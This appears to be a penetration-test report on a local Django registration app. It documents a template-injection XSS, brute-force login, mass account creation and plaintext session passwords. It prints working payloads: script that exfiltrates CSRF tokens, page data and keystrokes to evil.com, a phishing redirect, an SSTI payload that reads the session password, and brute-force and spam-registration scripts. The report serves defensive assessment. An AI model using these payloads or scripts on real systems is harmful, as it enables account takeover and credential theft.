# Security Assessment Report

## Executive Summary

**Target:** http://localhost:35837
**Assessment Date:** 2025-10-29
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Cross-Site Scripting (XSS) Vulnerabilities:**

One critical XSS vulnerability was successfully exploited through a Server-Side Template Injection (SSTI) weakness in the multi-step registration flow. The vulnerability allows unauthenticated attackers to inject arbitrary JavaScript that executes when victims reach registration Step 3. Impact includes CSRF token exfiltration (demonstrated), session hijacking through authenticated requests, credential harvesting, and phishing attacks. The root cause is unsafe string replacement in template compilation that bypasses Django's auto-escaping protection.

**Authentication Vulnerabilities:**

Three authentication vulnerabilities were successfully exploited:

1. **Unlimited Brute Force Login Attacks (HIGH):** No rate limiting, CAPTCHA, or account lockout enables automated password guessing. Demonstrated successful account takeover after 21 login attempts averaging 0.096 seconds each.

2. **Unlimited Registration Abuse (HIGH):** Allows mass spam account creation without controls. Demonstrated 55.82 accounts/second creation rate with 100% success rate, enabling database flooding and resource exhaustion.

3. **Plaintext Password Exposure via Session Data (CRITICAL):** Passwords stored in plaintext in Django sessions during registration can be extracted via SSTI, enabling credential theft for password reuse attacks on external services.

**Authorization Vulnerabilities:**

No authorization vulnerabilities were found. The application has minimal authorization requirements with only one protected endpoint (`/accounts/preferences/`) which properly implements the `@login_required` decorator. No object-level authorization exists as no endpoints accept user-controlled identifiers. The `is_premium` field exists but has no functional enforcement.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. The application exclusively uses Django ORM with automatic query parameterization for all database operations. No raw SQL execution, cursor usage, or system command execution was identified in any network-accessible code path.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. Static code analysis confirmed the application makes zero external HTTP requests from network-accessible endpoints. No vulnerable sinks (`requests`, `urllib`, `httplib`) are present in the codebase.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp (HTTP):** Caddy httpd reverse proxy serving the Django application
- **Port 443/tcp (HTTPS):** SSL/HTTPS service available but application accessed via HTTP on port 35837
- **Port 35837:** Django Art Gallery application (WSGIServer/0.2 CPython/3.9.2) - target application port
- **Port 631:** CUPS printing service (not relevant to application security)
- **Port 49152:** Golang net/http server with Tailscale (requires authentication, not relevant)

**Security-Relevant Findings:**
- Application running on Django development server (WSGIServer/0.2), not production-grade
- HTTP-only exposure on port 35837 with no TLS encryption
- Security headers detected: X-Frame-Options (DENY), X-Content-Type-Options, Referrer-Policy, Cross-Origin-Opener-Policy
- Missing critical security headers: Content-Security-Policy, HTTP Strict Transport Security

**Technology Stack:**
- Backend: Django 4.2.13 LTS with Python 3.9.2
- Frontend: Bootstrap 4, jQuery 3.5.1
- Template Engine: Django Template Language with auto-escaping enabled
- Database: MySQL 8.4 (internal Docker network, not externally exposed)

**Subdomain Discoveries:**
Multiple subdomains discovered (owa.regency.localhost, mail.localhost, autodiscover.localhost, etc.) appear to be external DNS artifacts not applicable to the localhost:35837 deployment.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Server-Side Template Injection Enabling Cross-Site Scripting

**Summary:**
- **Vulnerable location:** `http://localhost:35837/accounts/register/step1/` → name parameter → session storage → `http://localhost:35837/accounts/register/step3/` (template injection)
- **Overview:** A Server-Side Template Injection vulnerability in the multi-step registration flow allows attackers to inject arbitrary JavaScript that executes when the victim reaches Step 3. The vulnerability exists because user input from the `name` field is unsafely injected into a template via string replacement before compilation, bypassing Django's auto-escaping protection.
- **Impact:** An attacker can execute arbitrary JavaScript in victim browsers to steal CSRF tokens, perform unauthorized authenticated actions, exfiltrate sensitive data, inject keyloggers, or redirect users to phishing pages. This was demonstrated by successfully exfiltrating a CSRF token to an attacker-controlled server.
- **Severity:** Critical

**Prerequisites:**
None - this vulnerability is exploitable by unauthenticated attackers accessing the public registration flow.

**Exploitation Steps:**

1. Navigate to the registration form:
```
Open browser and visit: http://localhost:35837/accounts/register/step1/
```

2. Enter the malicious payload in the Name field and any valid password (minimum 10 characters):
```
Name: X</script><script>new Image().src='//evil.com?'+document.forms[0][0].value</script><script>//
Password: Password123456
```

3. Click the "Next" button to proceed to Step 2.

4. Enter any valid email address in Step 2:
```
Email: victim@example.com
```

5. Click the "Next" button to proceed to Step 3.

6. Upon loading Step 3 (`http://localhost:35837/accounts/register/step3/`), the malicious JavaScript executes automatically.

7. The injected script extracts the CSRF token from the form and exfiltrates it via an image request to the attacker's server.

**Proof of Impact:**

**JavaScript Execution Confirmed:**
- Alert dialog successfully displayed with message "XSS-VULN-01-Confirmed" using payload: `XSSTest</script><script>alert('XSS-VULN-01-Confirmed')</script><script>//`
- This confirms Level 3 exploitation (arbitrary JavaScript execution)

**Critical Impact - CSRF Token Exfiltration:**
- Network request captured: `[GET] http://evil.com/?9YxfCtee18dkXH6LhFvpqLOn0N3nBitkGXekf5o5qkogQA4s1Q7rPwTztqSp0MCW`
- The CSRF token `9YxfCtee18dkXH6LhFvpqLOn0N3nBitkGXekf5o5qkogQA4s1Q7rPwTztqSp0MCW` was successfully extracted from the registration form and exfiltrated to the attacker-controlled domain `evil.com`
- This confirms Level 4 exploitation (critical impact demonstrated)

**Attack Payload Analysis:**
```javascript
X</script><script>new Image().src='//evil.com?'+document.forms[0][0].value</script><script>//
```

**How the payload works:**
1. `X</script>` - Closes the original `<script>` tag containing the alert message
2. `<script>new Image().src='//evil.com?'+document.forms[0][0].value</script>` - Creates a new script tag that:
   - Instantiates a new Image object
   - Sets its `src` attribute to the attacker's domain with the CSRF token as a query parameter
   - `document.forms[0][0].value` retrieves the value of the first input field (csrfmiddlewaretoken) in the first form on the page
   - Browser automatically makes a GET request to evil.com, leaking the token
3. `<script>//` - Opens a new script tag with a comment to neutralize any trailing code from the original template

**Additional Impact Scenarios:**

While the CSRF token exfiltration demonstrates critical impact, this XSS vulnerability enables numerous other attacks:

**Session Hijacking via Authenticated Requests:**
- Although the session cookie has the HttpOnly flag (preventing direct access via `document.cookie`), XSS can still perform authenticated actions by making same-origin requests
- An attacker could fetch `/accounts/preferences/` to steal the user's email and premium status
- Example payload (exceeds 100 char limit but demonstrates capability):
  ```javascript
  fetch('/accounts/preferences/').then(r=>r.text()).then(d=>fetch('//evil.com',{method:'POST',body:d}))
  ```

**Credential Harvesting:**
- Inject a fake login form that sends credentials to the attacker
- Modify the registration form to capture the plaintext password before submission

**Keylogging:**
- Install a keylogger to capture all user input on the page
- Example: `document.onkeypress=e=>new Image().src='//evil.com?key='+e.key`

**Phishing/Redirection:**
- Redirect users to attacker-controlled phishing sites: `window.location='http://evil.com/fake-login'`

**Notes:**

**Vulnerability Root Cause:**
The vulnerability exists in `/accounts/register/step3/` view at lines 53-55:
```python
engine = engines["django"]
template_str = open('accounts/templates/accounts/register_step3.html','r').read()
template = engine.from_string(template_str.replace('ACCOUNTNAME', request.session['name']))
```

The code performs unsafe string replacement (`template_str.replace('ACCOUNTNAME', request.session['name'])`) to inject the user-controlled `name` value into the template source code before compilation. This bypasses Django's auto-escaping because the malicious content becomes part of the template syntax itself rather than template data.

**Validation Bypass:**
The `validate_name()` function in `forms.py:6-8` only blocks the `%` character, which is insufficient for preventing XSS in a JavaScript context. It does not block quotes, angle brackets, or other JavaScript metacharacters required for XSS prevention.

**Character Limit Constraint:**
The name field has a 100-character maximum length, which limits payload complexity but is sufficient for impactful attacks as demonstrated. More sophisticated payloads can use URL shorteners, encoded scripts, or external script loading to work within this constraint.

**No Defense Mechanisms:**
- No Content Security Policy (CSP) headers present
- No XSS protection headers
- No input sanitization beyond the inadequate "%" character block
- Django auto-escaping bypassed by template injection technique

**Reproduction Rate:**
100% - This vulnerability is consistently exploitable and requires no special conditions or race conditions.


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-03: Unlimited Brute Force Login Attacks

**Summary:**
- **Vulnerable location:** POST /accounts/login/
- **Overview:** Application allows unlimited login attempts without rate limiting, CAPTCHA, or account lockout, enabling brute force password attacks
- **Impact:** Complete account takeover through automated password guessing
- **Severity:** HIGH

**Prerequisites:**
- Target user account exists
- Attacker has username/email (easily obtainable)
- Common password list or password generation capability

**Exploitation Steps:**

1. Create a Python script to automate login attempts with different passwords:
   ```python
   import requests
   from bs4 import BeautifulSoup

   target = "http://localhost:35837/accounts/login/"
   username = "bruteforce@test.com"
   passwords = ["wrong1", "wrong2", ..., "CorrectPassword123"]

   for password in passwords:
       s = requests.Session()
       r = s.get(target)
       soup = BeautifulSoup(r.text, 'html.parser')
       csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

       data = {'username': username, 'password': password, 'csrfmiddlewaretoken': csrf}
       r = s.post(target, data=data)

       if r.url != target:  # Redirect indicates success
           print(f"Password found: {password}")
           break
   ```

2. Execute the brute force attack:
   ```bash
   python3 brute_force_demo.py
   ```

3. Script output demonstrates successful brute force:
   - **21 login attempts** made without any rate limiting
   - **0 blocked or throttled requests**
   - **Correct password discovered**: CorrectPassword123
   - **Average response time**: 0.096 seconds
   - **No account lockout** after 20 failed attempts

4. Verify account takeover by logging in with discovered credentials:
   ```bash
   curl -c cookies.txt -b cookies.txt \
     -d "username=bruteforce@test.com&password=CorrectPassword123&csrfmiddlewaretoken=[TOKEN]" \
     http://localhost:35837/accounts/login/
   ```

5. Access protected resource to confirm account takeover:
   ```bash
   curl -b cookies.txt http://localhost:35837/accounts/preferences/
   ```
   Returns HTTP 200 with user profile data

**Proof of Impact:**

Brute force attack results from `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/brute_force_demo_output.txt`:

```
================================================================================
BRUTE FORCE VULNERABILITY DEMONSTRATION
================================================================================

Target URL: http://localhost:35837/accounts/login/
Target Username: bruteforce@test.com
Total Passwords to Test: 21
Start Time: 2025-10-29 14:10:44

================================================================================
Attempt  Password             Status   Time (s)   Result
================================================================================
1        wrong1               200      0.109      FAILED
2        wrong2               200      0.093      FAILED
[... 18 more failed attempts ...]
21       CorrectPassword123   302      0.166      SUCCESS ✓
================================================================================

SUMMARY:
Total Attempts Made: 21
Successful Logins: 1
Blocked/Rate Limited: 0
Average Response Time: 0.096 seconds

VULNERABILITY ASSESSMENT:
✗ VULNERABLE: No rate limiting detected!
  All 21 login attempts were processed without blocking.
  This allows unlimited brute force attempts.

✓ Correct password found: CorrectPassword123
  Found after 21 attempts
```

**Account Takeover Confirmed:**
- Successfully logged in as "BruteForceTarget" user
- Accessed protected endpoint `/accounts/preferences/`
- Displayed user data: "Name: bruteforce@test.com"

**Notes:**
- No rate limiting library detected in codebase (no django-ratelimit, django-axes)
- No CAPTCHA implementation
- No account lockout mechanism
- No failed login tracking
- Attack can be scaled to test thousands of passwords

---

### AUTH-VULN-04: Unlimited Registration Abuse

**Summary:**
- **Vulnerable location:** POST /accounts/register/step1/, /accounts/register/step2/, /accounts/register/step3/
- **Overview:** Application allows unlimited account creation through automated registration without rate limiting, CAPTCHA, or email verification
- **Impact:** Massive spam account creation, database flooding, resource exhaustion
- **Severity:** HIGH

**Prerequisites:**
- None - registration is completely open to public

**Exploitation Steps:**

1. Create a Python script to automate the 3-step registration process:
   ```python
   import requests
   from bs4 import BeautifulSoup

   def create_account(name, email, password):
       s = requests.Session()

       # Step 1: Name and password
       r = s.get('http://localhost:35837/accounts/register/step1/')
       soup = BeautifulSoup(r.text, 'html.parser')
       csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

       data = {'name': name, 'password': password, 'csrfmiddlewaretoken': csrf}
       s.post('http://localhost:35837/accounts/register/step1/', data=data)

       # Step 2: Email
       r = s.get('http://localhost:35837/accounts/register/step2/')
       soup = BeautifulSoup(r.text, 'html.parser')
       csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

       data = {'email': email, 'csrfmiddlewaretoken': csrf}
       s.post('http://localhost:35837/accounts/register/step2/', data=data)

       # Step 3: Finalize
       r = s.get('http://localhost:35837/accounts/register/step3/')
       soup = BeautifulSoup(r.text, 'html.parser')
       csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

       data = {'is_premium': False, 'csrfmiddlewaretoken': csrf}
       r = s.post('http://localhost:35837/accounts/register/step3/', data=data)

       return r.status_code == 200

   # Create spam accounts
   for i in range(1, 11):
       create_account(f"SpamUser{i}", f"spam{i}@test.com", "SpamAccount123")
   ```

2. Execute sequential spam account creation:
   ```bash
   python3 registration_abuse_exploit.py
   ```
   Result: **10 accounts created in 2.08 seconds (4.82 accounts/second)**

3. Execute parallel spam account creation for scale test:
   ```bash
   python3 registration_abuse_scale_test.py
   ```
   Result: **50 accounts created in 0.90 seconds (55.82 accounts/second)**

4. Verify all spam accounts are functional:
   ```bash
   python3 verify_spam_accounts.py
   ```
   All 10 test accounts successfully logged in

**Proof of Impact:**

From `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/REGISTRATION_ABUSE_REPORT.md`:

```
### Test 1: Basic Registration Abuse (10 Accounts)
Results:
- Accounts Created: 10/10 (100% success)
- Time Taken: 2.08 seconds
- Rate: 4.82 accounts/second
- Accounts: SpamUser1-10 with emails spam1@test.com through spam10@test.com

### Test 2: Scale Test (50 Accounts - Parallel)
Results:
- Accounts Created: 50/50 (100% success)
- Time Taken: 0.90 seconds
- Rate: 55.82 accounts/second
- Parallel Threads: 10 concurrent connections

Projected Attack Capacity:
- 1 minute: ~3,348 accounts
- 1 hour: ~200,935 accounts
- 24 hours: ~4,822,451 accounts

### Test 3: Account Verification
Results:
- All 10 spam accounts successfully verified via login
- Confirmed accounts exist in database and are fully functional
```

**Total Spam Accounts Created:** 60 (10 sequential + 50 parallel)
**Success Rate:** 100% (60/60 accounts created successfully)
**Rate Limiting Observed:** None
**CAPTCHA Triggered:** Never
**Email Verification Required:** No

**Notes:**
- No rate limiting on any registration endpoint
- No email verification - accounts immediately active
- No anti-automation detection
- Demonstrates severe resource exhaustion risk

---

### AUTH-VULN-05: Plaintext Password Exposure via Session Data

**Summary:**
- **Vulnerable location:** POST /accounts/register/step1/ (password storage) and /accounts/register/step3/ (SSTI exposure)
- **Overview:** Passwords are stored in plaintext in Django sessions and can be extracted via Server-Side Template Injection during registration
- **Impact:** Credential theft enabling password reuse attacks on other services
- **Severity:** CRITICAL

**Prerequisites:**
- None - vulnerability exploitable during public registration process

**Exploitation Steps:**

1. Navigate to registration step 1:
   ```bash
   http://localhost:35837/accounts/register/step1/
   ```

2. Inject SSTI payload in the Name field to extract session password:
   - Name: `{{ request.session.password }}`
   - Password: `MySecretPassword999`

3. Complete step 2 with any email:
   - Email: `ssti_test@test.com`

4. At step 3, a JavaScript alert appears with the message:
   ```
   Hello MySecretPassword999. Just Now up to 50% OFF
   ```

5. The alert displays the plaintext password that was stored in the session, proving:
   - Password stored at step 1 in `request.session['password']` as plaintext
   - SSTI payload `{{ request.session.password }}` successfully extracts it
   - Password exposed in browser via template injection

**Proof of Impact:**

**Code Analysis:**
- Password storage: `/app/art_gallery/accounts/views.py:15`
  ```python
  request.session['password'] = form.cleaned_data['password']  # PLAINTEXT!
  ```

- Template injection: `/app/art_gallery/accounts/views.py:53-55`
  ```python
  engine = engines["django"]
  template_str = open('accounts/templates/accounts/register_step3.html','r').read()
  template = engine.from_string(template_str.replace('ACCOUNTNAME', request.session['name']))
  ```

- Never cleaned up: No `del request.session['password']` anywhere in codebase

**Exploitation Proof:**
1. Submitted name: `{{ request.session.password }}`
2. Submitted password: `MySecretPassword999`
3. JavaScript alert at step 3: "Hello MySecretPassword999..."
4. **Password successfully extracted from session via SSTI**

**Alternative exploitation via session hijacking:**
If an attacker hijacks a session cookie during or after registration, they could:
1. Access the Django session data (stored in MySQL `django_session` table)
2. Decode the session (base64-encoded pickle format)
3. Extract the plaintext password from `session['password']` key
4. Use password for credential stuffing attacks on other services

**Notes:**
- Password persists in session for up to 2 weeks (default Django session lifetime)
- Session stored in database, not encrypted, only signed
- Combining this with session hijacking enables complete credential theft
- SSTI vulnerability makes extraction trivial without needing database access
